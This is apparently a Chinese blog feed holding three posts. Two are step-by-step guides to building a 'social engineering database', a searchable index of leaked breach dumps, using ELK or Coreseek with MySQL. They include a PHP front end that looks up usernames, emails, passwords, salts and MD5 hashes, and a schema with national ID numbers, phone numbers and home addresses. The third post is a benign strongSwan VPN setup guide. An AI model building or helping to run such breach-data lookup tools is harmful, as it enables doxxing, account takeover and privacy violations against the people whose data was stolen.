<div><br><div><br><br>0x01 ELK是什么东西?<br><br>ELK是ElasticSearch、Logstash、Kibana三个应用的缩写。 ElasticSearch简称ES，主要用来存储和检索数据。Logstash主要用来往ES中写入数据。Kibana主要用来展示数据。<br><br>0x02 为什么用ELK?<br><br>传统的社工库通常用MySQL数据库来进行搭建，在相当大的数据下检索效率非常低下。在这种关系型数据库中进行查询需要明确指定列名。而在ES中可用全文检索，并且在大数据的查询中的响应几乎都是毫秒级的，速度相当之快！ELK原本用在日志的大数据收集和分析，其可怕的速度作为社工库也是一种不错的选择。<br><br>0x03 安装和配置<br><br>前提你需要一个很大的硬盘,大约社工库容量2.5倍的硬盘(ES会创建相关索引)。<br><br>你需要安装java至少7以上的版本。并且配置JAVA_HOME环境变量.<br><br>因为安装非常简单，只需要下载相应的压缩文件，解压即可。在此不再赘述。<br><br>我此次演示的环境在Windows8.1上,ES在Linux中不能使用root权限运行。<br><br>ES 2.0.0  Logstash 2.0.0  Kibana 4.2.0<br><br>修改配置文件：<br><br>ES/config/elasticsearch.yml<br><br>cluster.name: esdemo (集群的描述信息)<br><br>node.name: 63 (节点名称)<br><br>network.host: 192.168.1.5 (绑定的IP地址)<br><br>http.port: 9200 (端口号 默认9200)<br><br>一些Linux环境需要修改 ES/bin/elasticsearch 文件 增加<br><br>export JAVA_HOME=JDK路径<br><br>启动 ES/bin/elasticsearch或者elasticsearch.bat 即可启动<br><br>然后访问 <a href="http://localhost/IP:9200" target="_blank" rel="external">http://localhost/IP:9200</a> 可查看是否正常运行<br><br>Kibana/config/kibana.yml<br><br>elasticsearch.url: “<a href="http://192.168.1.5:9200" target="_blank" rel="external">http://192.168.1.5:9200</a>“ 指定ES地址<br><br>执行Kibana/bin/kibana 或者 kibana.bat启动<br><br>查看 <a href="http://localhost:5601" target="_blank" rel="external">http://localhost:5601</a> 是否正常启动<br><br>ElasticSearch 天生就很好的支持分布式,如果环境允许可以多使用几台负载。<br><br>为了方便理解 把ES中的一些概念和MySQL进行对比<br><br>ES  index(索引)  type(类型)  document(文档)                field(字段)<br><br>MySQL database  table                row                column<br><br>0x04 社工库搭建<br><br>以上工作准备完成之后,就该进入搭建的阶段了.首先确定有哪些列名存在ES中，我自己存了10列，给大家做个参考.<br><br>nickname(昵称)、password(密码)、email(邮箱)、qq(QQ号)、telno(手机号码)、idno(身份证号码)、realname(真实姓名)、address(家庭住址)、salt(盐值)、from(数据来源)。相对来说我这样划分的还是蛮详细的。但是在用Logstash写入ES的过程当中就比较费时了。其实如果想偷懒，完全可以把现有的数据只作为一个field写入，也是可以查询出来的。但是这样会比较乱，看着很不舒服。<br><br>我现在的主要做法是对一些现有的CSV文件,使用脚本进行清洗，洗成我规定的这些字段的格式。如果是.sql文件，则直接丢进mysql,然后再导出csv文件。也就是说不同的网站数据库最终全部是csv文件，并且是格式相同的csv。有字段不存在的则使用空字符替代。这样的话,可以在不更改logstash配置文件的情况下直接导入ES，也方便进行迁移。<br><br>配置logstash 文件(test.conf)<br><br></div><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315022290.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315022290.png" alt="20160301185523_2"></a><br><br>然后在logstash bin目录下面执行<br><br>Logstash.bat -f test.conf<br><br>就可以看到如下图:<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315025761.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315025761.png" alt="20160301185524_598"></a><br><br>正在往ES中写入数据。<br><br>在重复测试时，请注意要删除home目录下的sincedb文件。我提供了一段python代码来进行这些操作。<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315033686.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315033686.png" alt="20160301185524_192"></a><br><br>以上代码主要是用来删除创建的索引中的数据并且删除一些临时文件.<br><br>数据写完之后可以查看<br><br><a href="http://ip地址:9200/_cat/indices?v" target="_blank" rel="external">http://ip地址:9200/_cat/indices?v</a><br><br>来查看索引的信息<br><br>登录 Kibana<br><br><a href="http://localhost:5601/" target="_blank" rel="external">http://localhost:5601/</a><br><br>点击settings — index patterns Add new –输入你创建的index名称,点击create完成.<br><br>然后可以在Discover中进行搜索。<br><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315040631.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070315040631.png" alt="20160301185524_512"></a><br><br>也可以指定字段名进行搜索 例如：telno:13588888888.该语法为lucene 语法.<br><br>Have fun!!!<br><br>PS:<br><br>1、如果一亿条数据，本机测试也是毫秒级的查询，目前3亿条数据，速度也是很快。<br><br>2、这三款软件全部开源。可以在ES的官方下载，下载之后，简单的配置即可使用。<br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[搭建基于PHP+Mysql+Coreseek的社工库]]></title>
      <url>http://www.linux52.com/2016-07-03-e6-90-ad-e5-bb-ba-e5-9f-ba-e4-ba-8ephpmysqlcoreseek-e7-9a-84-e7-a4-be-e5-b7-a5-e5-ba-93.html</url>
      <content type="html"><![CDATA[<p>引用至 <a href="https://0x0d.im/archives/build-social-engineer-database-based-on-php-mysql-coreseek.html" target="_blank" rel="external">博客</a></p>
<p>之前下载过一些裤子，但是没怎么用过……一来是维护自己的社工库费时费力，二来在线的社工库也基本够用了。</p>
<p>后来导了一个10多G的裤子进 Mysql ，单表，数据有近2亿条，即使加了索引查起来也慢的不行，有时候还没有用暴力搜索文本内容的小工具查的快。于是查了下资料，试了试用 Coreseek 做全文索引，速度不错（毫秒级）。</p>
<p>从<a href="http://www.coreseek.cn/" target="_blank" rel="external">官网</a>下载最新版（4.1）的 Coreseek ，解压到某个目录，打开 etc 目录，里面有个 <code>csft_mysql.conf</code> 配置示例文件，贴一下我的配置文件（命名为 sed.conf ）：</p>
<p><pre class="prettyprint linenums">#源定义<br>source sed<br>{<br>    type                    = mysql<br>    sql_host                = localhost<br>    sql_user                = test<br>    sql_pass                = test<br>    sql_db                    = sed<br>    sql_port                = 3306<br>    sql_query_pre            = SET NAMES utf8<br>    sql_query                = SELECT <code>id</code>, <code>username</code>, <code>password</code>, <code>email</code>, <code>salt</code>, <code>order</code> FROM md5_sgk    #sql_query第一列id需为整数，username、password、email等作为字符串/文本字段，被全文索引<br>    sql_attr_uint            = id           #从SQL读取到的值必须为整数</pre></p>
<pre><code>#sql_field_string    = username
#sql_field_string    = password
#sql_field_string    = email
#sql_attr_timestamp        = date_added  #从SQL读取到的值必须为整数，作为时间属性
sql_query_info_pre      = SET NAMES utf8                                        #命令行查询时，设置正确的字符集
sql_query_info            = SELECT `id`, `username`, `password`, `email`, `salt`, `order` FROM md5_sgk WHERE id=$id #命令行查询时，从数据库读取原始数据信息
</code></pre><p>}</p>
<p>#index定义<br>index sed<br>{<br>    source            = sed           #对应的source名称<br>    path            = E:/SQL_DATA/coreseek/var/data/sed #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    docinfo            = extern<br>    mlock            = 0<br>    morphology        = none<br>    min_word_len        = 1<br>    ondisk_dict     = 1   #索引不载入内存而是保存在硬盘上<br>    html_strip                = 0</p>
<pre><code>#中文分词配置，详情请查看：http://www.coreseek.cn/products-install/coreseek_mmseg/
#charset_dictpath = /usr/local/mmseg3/etc/ #BSD、Linux环境下设置，/符号结尾
charset_dictpath = E:/SQL_DATA/coreseek/etc/ #Windows环境下设置，/符号结尾，最好给出绝对路径，例如：C:/usr/local/coreseek/etc/...
charset_type        = zh_cn.utf-8
</code></pre><p>}</p>
<p>#全局index定义<br>indexer<br>{<br>    mem_limit            = 1024M<br>}</p>
<p>#searchd服务定义<br>searchd<br>{<br>    listen                  =   9312<br>    read_timeout        = 5<br>    max_children        = 30<br>    max_matches            = 1000<br>    seamless_rotate        = 0<br>    preopen_indexes        = 0<br>    unlink_old            = 1<br>    pid_file = E:/SQL_DATA/coreseek/var/log/searchd_mysql.pid  #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    log = E:/SQL_DATA/coreseek/var/log/searchd_mysql.log        #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    query_log = E:/SQL_DATA/coreseek/var/log/query_mysql.log #请修改为实际使用的绝对路径，例如：/usr/local/coreseek/var/…<br>    binlog_path =                                #关闭binlog日志<br>}<br><br>具体的配置信息可以看看<a href="http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html" target="_blank" rel="external">官方手册</a>。</p>
<p>有些资料里使用了 <strong>sql_field_string</strong>，但是据测试很可能出现 <a href="http://sphinxsearch.com/bugs/view.php?id=1131" target="_blank" rel="external">too many string attributes (current index format allows up to 4 GB)</a> 这个错误，不知是不是因为是32位程序的原因，所以最好不要用，或者可以试试64位的 <strong><a href="http://sphinxsearch.com/downloads/release/" target="_blank" rel="external">Sphinx</a></strong>。</p>
<p>然后把 <strong>searchd</strong> 注册成服务 <code>searchd --install --config ..\etc\sed.conf</code>，以免每次使用都要在命令行窗口打开。</p>
<p>接着用 <code>indexer -c ..\etc\sed.conf --all --rotate</code> 建立全文索引。<br>如果有增量索引的还要合并索引（我测试的时候并没有做增量索引，可以参考<a href="http://blog.csdn.net/e421083458/article/details/21529969" target="_blank" rel="external">这篇文章</a>。）</p>
<p>索引建立完后试试能否正常搜索： <code>search -c ..\etc\sed.conf adwin</code> ，如果出现 search error: failed to open xxx.sph: No such file or directory 这个错误，可能原因有：</p>
<blockquote>
<p>It seems that</p>
<p>a) the lock files were lost somehow, and</p>
<p>b) you ran indexer without –rotate switch.</p>
<p>Normally, searchd would create .spl lock files on startup (and kill them on shutdown),</p>
<p>and indexer would then refuse to reindex without –rotate switch.</p>
<p>indexers sends SIGHUP to searchd when completed (and it should print that out). searchd</p>
<p>then does the following:</p>
<ol>
<li>waits for all children to exit</li>
<li>renames current index files to .old</li>
<li>renames .new index files to current</li>
<li>tries to load current index files</li>
<li>if something failed, it rollbacks current files from .old and new to .new</li>
</ol>
<p>In your case I would start with double checking directory access rights, users which both</p>
<p>indexer and searchd run under, etc.<br>据我的经验一般把 data 目录下的文件名里多出来的<code>.new</code>去掉就好。</p>
</blockquote>
<p>最后调用自带的 <strong>sphinxapi.php</strong> 即可，我直接用的 Ph4nt0m 的源码（界面用 Bootstrap 重写了下）：</p>
<p><pre class="prettyprint linenums"><br>&lt;?php<br>// 引用sphinxapi类<br>require “sphinxapi.php”;<br>//关闭错误提示<br>error_reporting(E_ALL &amp; ~E_NOTICE);<br>$num = 0;<br>if (!empty($_GET) &amp;&amp; !empty($_GET[‘q’])) {<br>    $Keywords = strip_tags(trim($_GET[‘q’]));<br>    if (!empty($_GET[‘m’]) &amp;&amp; 1 == $_GET[‘m’]) {<br>        $Keywords = substr(md5($Keywords), 8, 16);<br>    }<br>    if (!empty($_GET[‘m’]) &amp;&amp; 2 == $_GET[‘m’]) {<br>        $Keywords = md5($Keywords);<br>    }<br>    $cl = new SphinxClient();<br>    // 返回结果设置<br>    $cl-&gt;SetServer(‘127.0.0.1’, 9312);<br>    $cl-&gt;SetConnectTimeout(3);<br>    $cl-&gt;SetArrayResult(true);<br>    // 设置是否全文匹配<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘f’])) {<br>        $cl-&gt;SetMatchMode(SPH_MATCH_ALL);<br>    } else {<br>        $cl-&gt;SetMatchMode(SPH_MATCH_ANY);<br>    }<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘p’])) {<br>        $p = !intval(trim($_GET[‘p’])) == 0 ? intval(trim($_GET[‘p’])) - 1 : 0;<br>        $p = $p <em> 20;<br>        // 我在sed.conf 设置了最大返回结果数1000。但是我在生成页码的时候最多生成20页，我想能满足大部分搜索需求了。<br>        // 以下语句表示从P参数偏移开始每次返回20条。<br>        $cl-&gt;setLimits($p, 20);<br>    } else {<br>        $cl-&gt;setLimits(0, 20);<br>    }<br>    $res = $cl-&gt;Query(“.$Keywords.”, “</em>“);<br>    @mysql_connect(“localhost”, “test”, “test”); //数据库账号密码<br>    mysql_select_db(“sed”); //数据库库名名<br>    if (is_array($res[“matches”])) {<br>        foreach ($res[“matches”] as $docinfo) {<br>            $ids = $ids . $docinfo[id] . ‘,’;<br>        }<br>        $ids = rtrim($ids, ‘,’);<br>        $sql = “select * from md5_sgk where id in($ids)”; //注意修改表名<br>        mysql_query(“set names utf8”);<br>        $ret = mysql_query($sql);<br>        $num = mysql_num_rows($ret);<br>    }<br>}<br>?&gt;<br>&lt;!DOCTYPE html&gt;</pre></p>
<html><br><head><br>   <title>The Web of Answers</title><br>   <meta charset="UTF-8"><br>   <meta name="viewport" content="width=device-with,initial-scal=1"><br>   <link href="css/bootstrap.min.css" rel="stylesheet"><br>   <script src="js/jquery.js"></script><br>   <script src="js/bootstrap.min.js"></script><br>   <script><br>    function check(form){<br>        if(form.q.value==””){<br>          alert(“Not null !”);<br>          form.q.focus();<br>          return false;<br>        }<br>    }<br>    </script><br>   <style><br>        h1 {<br>            font-family: Times New Roman, Lucida Handwriting;<br>        }<br>        body {<br>            background-image: url(img/bg.jpg);<br>        }<br>   </style><br></head><br><body><br>    <div class="container" id="container"><br>        <div id="page-header"><br><br>#  The Web of Answers<br><br>        </div><br>        <div class="row"><br>        <form action="" method="get" class="form-horizontal" role="form"><br>            <div id="checkbox" class="col-md-6 col-md-offset-3"><br>                <label class="checkbox-inline"><br>                    <input type="checkbox" id="full" name="f" value="1">   完整匹配<br>                </label><br>                <label class="checkbox-inline"><br>                      <input type="checkbox" id="md5_16" name="m" value="1"><br>                       MD5匹配（16位）<br>                </label><br>                <label class="checkbox-inline"><br>                      <input type="checkbox" id="md5_32" name="m" value="2"><br>                       MD5匹配（32位）<br>                </label><br>            </div><br>            <div class="input-group col-md-6 col-md-offset-3"><br>                <input type="text" class="form-control" name="q" placeholder="请输入" value="<?php echo strip_tags(trim($_GET['q']));?>"><br>                    <div class="input-group-btn"><br>                        <button type="submit" class="btn btn-primary" onclick="check(form)">Search</button><br>                    </div><br>             </div><br>        </form><br>    </div><br><br>&lt;?php<br>if (0 == !$num) {<br>    echo “<div class="\"row\""><br>    <div class="\"alert" alert-success="" alert-dismissible="" col-md-10="" col-md-offset-1\"="" role="\"alert\""><br>    <button type="\"button\"" class="\"close\"" data-dismiss="\"alert\""><span aria-hidden="\"true\"">&times;</span><span class="\"sr-only\"">Close</span></button><br>    找到与<strong>&amp;nbsp{$Keywords}&amp;nbsp</strong>相关的结果 {$res[total_found]} 个。用时 {$res[time]} 秒。</div>“;<br>    echo “<div class="\"table-responsive" col-md-10="" col-md-offset-1\"=""><br>        <table class="\"table" table-striped="" table-hover\"=""><br>          <tr><br>          <th>Username</th><br>          <th>Email</th><br>          <th>Password</th><br>          <th>Salt</th><br>          <th>From</th><br>          </tr>“;<br>    while ($row = mysql_fetch_assoc($ret)) {<br>        echo “<tr><td>“ . $row[‘username’] . “</td>“;<br>        echo “<td>“ . $row[‘email’] . “</td>“;<br>        echo “<td>“ . $row[‘password’] . “</td>“;<br>        echo “<td>“ . $row[‘salt’] . “</td>“;<br>        echo “<td>“ . $row[‘order’] . “</td></tr>“;<br>    }<br>    echo “</table></div></div>“;<br>} else {<br>    if (!empty($_GET) &amp;&amp; !empty($_GET[‘q’])) {<br>        echo “<div class="\"alert" alert-warning="" alert-dismissible="" col-md-10="" col-md-offset-1\"="" role="\"alert\""><br>        <button type="\"button\"" class="\"close\"" data-dismiss="\"alert\""><span aria-hidden="\"true\"">&times;</span><span class="\"sr-only\"">Close</span></button><br>        找不到与<strong>&amp;nbsp{$Keywords}&amp;nbsp</strong>相关的结果。请更换其他关键词试试。</div></div>“;<br>    }<br>}<br>?&gt;<br>    <div id="pages"><br>    <center><br>        <nav><br><br>&lt;?php<br>if (0 == !$num) {<br>    $pagecount = (int) ($res[total_found] / 20);<br>    if (!($res[total_found] % 20) == 0) {<br>        $pagecount = $pagecount + 1;<br>    }<br>    if ($pagecount &gt; 20) {<br>        $pagecount = 20;<br>    }<br>    $highlightid = !intval(trim($_GET[‘p’])) == 0 ? intval(trim($_GET[‘p’])) : 1;<br>    for ($i = 1; $i &lt;= $pagecount; $i++) {<br>        if ($highlightid == $i) {<br>            echo “<em>   <a href="\">{$i}<span class="\"sr-only\"">(current)</span></a><br>“;<br>        } else {<br>            echo “</em>   <a href="\">{$i}</a><br>        </nav><br>    </center><br>    </div><br>    <div id="footer"><br><br>            The Web of Answers &copy;2010-2015 | Powered by b0rg<br><br>    </div><br>    <br></body><br></html>

<p><br><strong>效果：</strong><br><a href="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070317045815.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/07/2016070317045815.png" alt="2340039264"></a></p>
<p><strong>参考资料：</strong></p>
<blockquote>
<p><a href="http://zone.wooyun.org/content/9377" target="_blank" rel="external">MySQL+Sphinx+CoreSeek数据库查询脚本</a></p>
<p><a href="http://www.freebuf.com/articles/database/53139.html" target="_blank" rel="external">经验分享：社会工程学数据库搭建TIPS</a></p>
<p><a href="http://blog.csdn.net/e421083458/article/details/21529969" target="_blank" rel="external">搭建coreseek(sphinx+mmseg3)详细安装配置+php之sphinx扩展安装+php调用示例</a></p>
<p><a href="http://www.coreseek.cn/docs/coreseek_4.1-sphinx_2.0.1-beta.html" target="_blank" rel="external">Coreseek 4.1 参考手册</a></p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu安装和配置strongSwan]]></title>
      <url>http://www.linux52.com/2016-06-15-ubuntu-e5-ae-89-e8-a3-85-e5-92-8c-e9-85-8d-e7-bd-aestrongswan.html</url>
      <content type="html"><![CDATA[<p>记录在Ubuntu 14.04上安装和配置strongSwan的过程。</p>
<p>装完之后才发现只能在墙内翻腾，一番调查后发现客户端的IKE_AUTH包根本无法到达墙外的服务端，改端口也没用。不过好歹也折腾了一番，姑且记下来。</p>
<h2 id="编译安装strongSwan"><a href="#编译安装strongSwan" class="headerlink" title="编译安装strongSwan"></a>编译安装strongSwan</h2><p>Ubuntu 14.04仓库里的strongSwan是5.1.2版本的，稍微有点老，这里从官方网站下载最新的5.3.0版本。</p>
<div class="codehilite"><br><pre>cd /tmp<br>wget <a href="http://download.strongswan.org/strongswan-5.3.0.tar.bz2" target="_blank" rel="external">http://download.strongswan.org/strongswan-5.3.0.tar.bz2</a><br>tar xvf strongswan-5.3.0.tar.bz2<br>cd strongswan-5.3.0<br></pre><br></div><br>在编译strongSwan之前先安装一下依赖库:<br><div class="codehilite"><br><pre>sudo apt-get install libpam0g-dev libssl-dev build-essential<br></pre><br></div><br>参考网上的一篇<a href="https://hjc.im/shi-yong-strongswanda-jian-ipsecikev2-vpn/" target="_blank" rel="external">教程</a>，使用如下参数编译strongSwan。另外，如果你的VPS是OpenVZ服务器<sup id="fnref:1"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:1" target="_blank" rel="external">1</a></sup>，据说还应该再加上一个<code>--enable-kernel-libipsec</code>参数。<br><div class="codehilite"><br><pre>./configure  –enable-eap-identity –enable-eap-md5 \<br>–enable-eap-mschapv2 –enable-eap-tls –enable-eap-ttls –enable-eap-peap  \<br>–enable-eap-tnc –enable-eap-dynamic –enable-eap-radius –enable-xauth-eap  \<br>–enable-xauth-pam  –enable-dhcp  –enable-openssl  –enable-addrblock –enable-unity  \<br>–enable-certexpire –enable-radattr –enable-openssl –disable-gmp<br></pre><br></div><br>最后编译并安装<br><div class="codehilite"><br><pre>make<br>sudo make install<br></pre><br></div><br>如果在configure的时候没有配置<code>--prefix</code>参数，那么strongSwan默认被安装到<code>/usr/local</code>目录下，配置文件安装在<code>/usr/local/etc</code>目录下。<br><br>## 创建密钥和证书<br><br>这里可参考这篇<a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">文章</a>和官方wiki上的一篇<a href="https://wiki.strongswan.org/projects/strongswan/wiki/SimpleCA" target="_blank" rel="external">教程</a>。<br><br>为方便，下面的命令不再加sudo，可以直接su。<br><br>### 自签署根证书<br><br>首先创建一个根证书的RSA密钥:<br><div class="codehilite"><br><pre>cd /usr/local/etc/ipsec.d<br><br>ipsec pki –gen –type rsa \<br>–size 4096 –outform pem \<br>&gt; private/strongSwanCAKey.pem<br></pre><br></div><br>然后使用这个密钥自签署一个根证书(公钥):<br><div class="codehilite"><br><pre>ipsec pki –self –ca –lifetime 3650 \<br>–in private/strongSwanCAKey.pem –type rsa \<br>–dn “C=CH, O=strongSwan, CN=strongSwan Root CA” \<br>–outform pem &gt; cacerts/strongSwanCACert.pem<br></pre><br></div>

<h3 id="服务端密钥和证书"><a href="#服务端密钥和证书" class="headerlink" title="服务端密钥和证书"></a>服务端密钥和证书</h3><p>接下来，创建服务端使用的密钥和证书，<strong>记得</strong>把<code>--dn</code>和<code>--san</code>参数的<code>myvpn.domain</code>改成自己VPS的域名或IP<sup id="fnref:2"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:2" target="_blank" rel="external">2</a></sup><sup id="fnref:3"><a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#fn:3" target="_blank" rel="external">3</a></sup>。</p>
<div class="codehilite"><br><pre>ipsec pki –gen –type rsa –size 2048 \<br>–outform pem &gt; private/strongSwanServerKey.pem<br><br>ipsec pki –pub –in private/strongSwanServerKey.pem –type rsa | \<br>ipsec pki –issue –lifetime 730 \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–dn “C=CH, O=strongSwan, CN=myvpn.domain” \<br>–san myvpn.domain \<br>–flag serverAuth –flag ikeIntermediate \<br>–outform pem &gt; certs/strongSwanServerCert.pem<br></pre><br></div>

<h3 id="客户端密钥和证书"><a href="#客户端密钥和证书" class="headerlink" title="客户端密钥和证书"></a>客户端密钥和证书</h3><p>然后生成客户端的密钥和证书，生成证书时<strong>记得</strong>把<code>--dn</code>和<code>--san</code>参数的邮件地址<code>aabb@myvpn.domain</code>改成自己的。</p>
<div class="codehilite"><br><pre>ipsec pki –gen –type rsa –size 2048 \<br>–outform pem &gt; private/clientAABBKey.pem<br><br>ipsec pki –pub –in private/clientAABBKey.pem –type rsa | \<br>ipsec pki –issue –lifetime 730 \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–dn “C=CH, O=strongSwan, CN=aabb@myvpn.domain” \<br>–san aabb@myvpn.domain \<br>–outform pem &gt; certs/clientAABBCert.pem<br></pre><br></div><br>为了方便在Win7和IOS客户端上使用，我们把根证书和客户端的密钥+证书打包成一个<a href="http://en.wikipedia.org/wiki/PKCS_12" target="_blank" rel="external">PKCS #12</a>文件。这一步会提示输入密码，也可以留空。<br><div class="codehilite"><br><pre>openssl pkcs12 -export -inkey private/clientAABBKey.pem \<br>-in certs/clientAABBCert.pem -name “AABB’s Client Certificate” \<br>-certfile cacerts/strongSwanCACert.pem \<br>-caname “strongSwan Root CA” \<br>-out private/clientAABB.p12<br></pre><br></div>

<h3 id="设置密钥和证书权限"><a href="#设置密钥和证书权限" class="headerlink" title="设置密钥和证书权限"></a>设置密钥和证书权限</h3><p><strong>记得</strong>设置一下证书目录和文件的权限:</p>
<div class="codehilite"><br><pre>chmod 700 cacerts certs private crls<br>chmod 600 cacerts/<em> certs/</em> private/<em><br></em></pre><br></div><br>最后，罗列一下刚刚创建的密钥和证书:<br><div class="codehilite"><br><pre>cacerts/:<br>    strongSwanCACert.pem        –   根证书，用于签署服务端和客户端的证书<br><br>certs/:<br>    clientAABBCert.pem          –  <em> 客户端aabb的证书<br>    strongSwanServerCert.pem    –  服务端的证书<br><br>private/:<br>    strongSwanCAKey.pem         –  根证书的密钥<br>    clientAABBKey.pem           –  </em> 客户端aabb的密钥<br>    clientAABB.p12              –  <em> 根证书+客户端密钥+客户端证书<br>    strongSwanServerKey.pem     –  服务端的密钥<br></em></pre><br></div><br>上面加()号的都是需要下载到客户端安装的文件。<br><br>### 吊销客户端证书<br><br>有时候可能想吊销AABB客户端的证书，可以使用如下命令:<br><div class="codehilite"><br><pre>ipsec pki –signcrl –reason key-compromise \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–cert certs/clientAABBCert.pem \<br>–outform pem &gt; crls/crl.pem<br></pre><br></div><br>如果还想吊销一个客户端证书，参考这篇<a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">教程</a>，需要先将老的crl.pem文件保存到一个临时文件里:<br><div class="codehilite"><br><pre>cp crls/crl.pem crl.pem.tmp<br><br>ipsec pki –signcrl –reason key-compromise \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–cert certs/StolenClientCert.pem \<br>–lastcrl crl.pem.tmp \<br>–outform pem &gt; crls/crl.pem<br><br>rm crl.pem.tmp<br></pre><br></div>

<h2 id="配置strongSwan"><a href="#配置strongSwan" class="headerlink" title="配置strongSwan"></a>配置strongSwan</h2><h3 id="ipsec-conf"><a href="#ipsec-conf" class="headerlink" title="ipsec.conf"></a>ipsec.conf</h3><p>ipsec.conf的详细参数说明可参考官方的<a href="https://wiki.strongswan.org/projects/strongswan/wiki/IpsecConf" target="_blank" rel="external">wiki</a>。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/ipsec.conf &lt;&lt; EOF<br>config setup<br>    uniqueids=never<br><br>conn ubuntu-networkmanager-strongswan<br>    keyexchange=ikev2<br>    left=%defaultroute<br>    leftauth=pubkey<br>    leftsubnet=0.0.0.0/0<br>    leftcert=strongSwanServerCert.pem<br>    right=%any<br>    rightauth=pubkey<br>    rightsourceip=10.31.2.0/24<br>    rightcert=clientAABBCert.pem<br>    auto=add<br>EOF<br></pre><br></div><br>注意rightsourceip这里配置的ip段，稍后要添加iptables规则。<br><br>### ipsec.secrets<br><br>这里保存服务器证书的密钥和登录密码等内容，如果密钥有密码，也要在后面加上，详细说明见<a href="https://wiki.strongswan.org/projects/strongswan/wiki/IpsecSecrets" target="_blank" rel="external">官方文档</a>。<br><div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/ipsec.secrets &lt;&lt; EOF<br>: RSA strongSwanServerKey.pem<br>: PSK “A quick bRown FOX jumps”<br>: XAUTH “0ver a Lazy 0ld Dog”<br>aabb %any : EAP “BBAA”<br>EOF<br></pre><br></div>

<h3 id="strongswan-conf"><a href="#strongswan-conf" class="headerlink" title="strongswan.conf"></a>strongswan.conf</h3><p>配置strongswan，官方文档见<a href="https://wiki.strongswan.org/projects/1/wiki/StrongswanConf" target="_blank" rel="external">这里</a>。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/strongswan.conf &lt;&lt; EOF<br>charon {<br>    load_modular = yes<br>    duplicheck.enable = no<br>    compress = yes<br>    plugins {<br>        include strongswan.d/charon/<em>.conf<br>    }<br>    dns1 = 8.8.8.8<br>    dns2 = 8.8.4.4<br>    nbns1 = 8.8.8.8<br>    nbns2 = 8.8.4.4<br>}<br>include strongswan.d/</em>.conf<br>EOF<br></pre><br></div>

<h3 id="charon-logging-conf"><a href="#charon-logging-conf" class="headerlink" title="charon-logging.conf"></a>charon-logging.conf</h3><p>strongswan的默认配置会把日志写到系统日志里，可以参考<a href="https://wiki.strongswan.org/projects/strongswan/wiki/LoggerConfiguration" target="_blank" rel="external">官方文档</a>将日志写入一个单独的文件。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/strongswan.d/charon-logging.conf &lt;&lt; EOF<br>charon {<br>    filelog {<br>        /var/log/strongswan.log {<br>            append = yes<br>            default = 1<br>            flush_line = yes<br>            ike_name = yes<br>            time_format = %b %e %T<br>        }<br>    }<br>}<br>EOF<br></pre><br></div>

<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="ip转发"><a href="#ip转发" class="headerlink" title="ip转发"></a>ip转发</h3><p>修改<code>/etc/sysctl.conf</code>，启用ip转发，取消注释。</p>
<div class="codehilite"><br><pre>net.ipv4.ip_forward = 1<br></pre><br></div><br>然后导入配置<br><div class="codehilite"><br><pre>sudo sysctl -p<br></pre><br></div>

<h3 id="iptables配置"><a href="#iptables配置" class="headerlink" title="iptables配置"></a>iptables配置</h3><p>先备份下当前的配置:</p>
<div class="codehilite"><br><pre>sudo iptables-store &gt; ~/iptables.rules<br></pre><br></div><br>用下面的命令确认下网络接口，如果不是eth0，注意替换成实际的接口。<br><div class="codehilite"><br><pre>ip route show | grep ‘^default’ | sed -e ‘s/.<em> dev ([^ ]</em>).*/\1/‘<br></pre><br></div><br>添加如下规则:<br><div class="codehilite"><br><pre>iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT<br>iptables -A FORWARD -s 10.31.2.0/24  -j ACCEPT<br>iptables -A INPUT -i eth0 -p esp -j ACCEPT<br>iptables -A INPUT -i eth0 -p udp –dport 500 -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp –dport 500 -j ACCEPT<br>iptables -A INPUT -i eth0 -p udp –dport 4500 -j ACCEPT<br>iptables -A FORWARD -j REJECT<br>iptables -t nat -A POSTROUTING -s 10.31.2.0/24 -o eth0 -j MASQUERADE<br><br># 解决有的网站无法访问的问题<br>iptables -t mangle -A FORWARD -o eth0 -p tcp -m tcp \<br>–tcp-flags SYN,RST SYN -m tcpmss –mss 1361:1536 \<br>-j TCPMSS –set-mss 1360<br></pre><br></div>

